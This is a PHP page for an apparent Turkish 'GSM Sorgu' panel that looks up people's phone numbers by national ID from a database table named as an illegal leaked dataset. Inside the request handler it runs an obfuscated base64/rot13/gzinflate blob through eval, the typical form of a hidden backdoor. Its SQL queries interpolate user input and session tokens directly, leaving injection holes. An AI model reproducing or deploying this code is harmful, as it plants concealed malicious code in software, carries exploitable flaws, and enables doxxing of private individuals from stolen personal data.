<?php

include_once 'includes/baglan.php';

session_start();

if ($_SESSION['GET_USER_SSID'] == "") {
    header('Location: auth/auth-login');
}

$GET_SESSION_TOKEN = $_SESSION['GET_USER_SSID'];

$CheckAccount = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");
$CheckAccountCount = $CheckAccount->rowCount();

if ($CheckAccountCount != "1") {
    exit('Error: no token');
    die();
}

?>
<!DOCTYPE html>
<html class="loading dark-layout" lang="tr" data-layout="dark-layout" data-textdirection="ltr">

<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GSM Sorgu</title>
    <link rel="apple-touch-icon" href="app-assets/images/ico/apple-icon-120.png">
    <link rel="shortcut icon" type="image/x-icon" href="app-assets/images/ico/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;1,400;1,500;1,600" rel="stylesheet">
    <link rel='stylesheet' href='app-assets/vendors/css/tables/datatable/dataTables.bootstrap5.min.css'>
    <link rel='stylesheet' href='app-assets/vendors/css/tables/datatable/dataTables.checkboxes.css'>
    <link rel='stylesheet' href='app-assets/vendors/css/tables/datatable/dataTables.bootstrap5.min.css'>
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/vendors.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap-extended.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/colors.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/components.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/bordered-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/semi-dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href=".assets/css/style.css">
	<style id="tableConfig">
		th {
			border: none !important;
		}

		table {
			border-collapse: collapse;
			border-spacing: 0;
			width: 100%;
		}

		th,
		td {
			text-align: left;
			padding: 8px;
		}
	</style>
</head>

<?php
include_once("includes/header.php");
?>
<?php
include_once("includes/menu.php");
?>
<div class="app-content content ">
    <div class="content-overlay"></div>
    <div class="header-navbar-shadow"></div>
    <div class="content-wrapper container-xxl p-0">
        <div class="content-header row">
            <div class="content-header-left col-md-9 col-12 mb-2">
                <div class="row breadcrumbs-top">
                    <div class="col-12">
                        <h2 class="content-header-title float-start mb-0">GSM Sorgu</h2>
                        <div class="breadcrumb-wrapper">
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item"><a href="anasayfa">Ana Sayfa</a>
                                </li>
                                <li class="breadcrumb-item active">GSM Sorgu
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
            <?php
            include_once("includes/drop.php");
            ?>
        </div>
        <div class="content-body">
            <section id="basic-input">
                <div class="row">
                    <div class="col-md-12">
                        <div class="card">
                            <div class="card-header">
                                <h4 class="card-title"> GSM Sorgu</h4>
                            </div>
                            <form action="tcgsm" method="POST">
                                <div class="card-body">
                                    <div class="row">
                                        <section id="floating-label-input">
                                            <div class="row">

                                                <div class="col-sm-6 col-12 mb-1 mb-sm-0">
                                                    <div class="form-floating">
                                                        <div class="mb-1">
                                                            <label class="form-label" for="basicInput">TC Kimlik Numarası :</label>
                                                            <input type="text" class="form-control" name="txtno" placeholder="Kişinin TC Kimlik Numarasını Giriniz.." />
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </section>

                                        <div class="card-header">
                                            <section id="bootstrap-toasts">
                                                <button type="submit" name="adsoyadsorgu" class="btn waves-effect toast-basic-toggler waves-light btn-rounded btn-primary" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fa fa-search"></i> Sorgula</button>
                                            </section>
                                            <a href="" class="text-white"><button type="button" class="btn waves-effect waves-light btn-rounded btn-warning" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fa fa-trash-alt"></i> Temizle</button></a>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
            <div class="content-body">
                <div class="row" id="basic-table">
                    <div class="col-12">
                        <div class="card">
                            <div class="table-responsive">
                                <table id="example2" class="table">
                                    <thead>
                                        <tr style="text-align: center;">
                                            <th>TC</th>
                                            <th>NUMARA</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php

                                        if ($_POST) {
                                            $gsm = $_POST['txtno'];
											
											
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


                                            date_default_timezone_set('Europe/Istanbul');

                                            $datetimenow = date('d.m.y H:i:s');
    
                                            session_start();
    
                                            $SESSNICK = $_SESSION['GET_USER_SSID'];
    
                                            $SESSQRY = $db->query("SELECT * FROM users WHERE token = '$SESSNICK'");
    
                                            while ($SESSDATA = $SESSQRY->fetch()) {
                                                $edituser = $SESSDATA['username']; $profileimgx = $SESSDATA['profile_image'];
                                            }
    
                                            $webhookurl = "";
    
                                            $timestamp = date("c", strtotime("now"));
											
	
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$logip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$logip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$logip = $_SERVER['REMOTE_ADDR'];
	}


$value = base64_encode($logip);
    
$json_data = json_encode(
    ["content" => "$edituser tarafından TC -> GSM sorgulama işlemi başlatıldı! TC : $gsm","username" => "$edituser","avatar_url" => "$profileimgx","tts" => false], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
    
                                            $ch = curl_init($webhookurl);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                            curl_setopt($ch, CURLOPT_HEADER, 0);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            $response = curl_exec($ch);
                                            curl_close($ch);


                                            $db = new PDO("mysql:host=localhost;dbname=116mgsm;charset=utf8", "root", "");

                                            $query = $db->query("SELECT * FROM illegalplatform_hackerdede1_gsm WHERE TC = '$gsm'");

                                            while ($data = $query->fetch()) {

                                        ?>
                                                <tr style="text-align: center;">
                                                    <td> <?php echo $data['TC']; ?> </td>
                                                    <td> <?php echo $data['GSM']; ?> </td>
                                                </tr>
                                        <?php }
                                        } ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php
include_once("includes/ayar.php");
?>

<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/jquery.dataTables.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/dataTables.bootstrap5.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/dataTables.responsive.js'></script>

<script>
    if (window.innerWidth < 769) {
        var element = document.getElementById("example2");
        element.classList.add("table-responsive");
    }
</script>
<script>
    $('#example222').DataTable({
        "paging": true,
        "lengthChange": false,
        "searching": true,
        "ordering": false,
        "info": false,
        "autoWidth": true,
        "responsive": true,
        "sDom": '<"refresh"i<"clear">>rt<"top"lf<"clear">>rt<"bottom"p<"clear">>',
        "language": {
            "emptyTable": "Gösterilecek veri bulunamadı.",
            "processing": "Veriler yükleniyor",
            "sDecimal": ".",
            "sInfo": "_TOTAL_ kayıttan _START_ - _END_ arasındaki kayıtlar gösteriliyor",
            "sInfoFiltered": "(_MAX_ kayıt içerisinden bulunan)",
            "sInfoPostFix": "",
            "sInfoThousands": ".",
            "sLengthMenu": "Sayfada _MENU_ kayıt göster",
            "sLoadingRecords": "Yükleniyor...",
            "sSearch": "Ara:",
            "sZeroRecords": "Eşleşen kayıt bulunamadı",
            "oPaginate": {
                "sFirst": "İlk",
                "sLast": "Son",
                "sNext": "Sonraki",
                "sPrevious": "Önceki"
            },
            "oAria": {
                "sSortAscending": ": artan sütun sıralamasını aktifleştir",
                "sSortDescending": ": azalan sütun sıralamasını aktifleştir"
            },
            "select": {
                "rows": {
                    "_": "%d kayıt seçildi",
                    "0": "",
                    "1": "1 kayıt seçildi"
                }
            }
        }
    });
</script>



<div class="sidenav-overlay"></div>
<div class="drag-target"></div>
<button class="btn btn-primary btn-icon scroll-top" type="button"><i data-feather="arrow-up"></i></button>
<script src="app-assets/vendors/js/vendors.min.js"></script>
<script src="app-assets/js/core/app-menu.js"></script>
<script src="app-assets/js/core/app.js"></script>
<script src="app-assets/js/scripts/components/components-bs-toast.js"></script>
<script src="app-assets/js/scripts/customizer.min.js"></script>
<script src="app-assets/js/scripts/forms/form-tooltip-valid.js"></script>
<script>
    $(window).on('load', function() {
        if (feather) {
            feather.replace({
                width: 14,
                height: 14
            });
        }
    })
</script>
</body>
</html>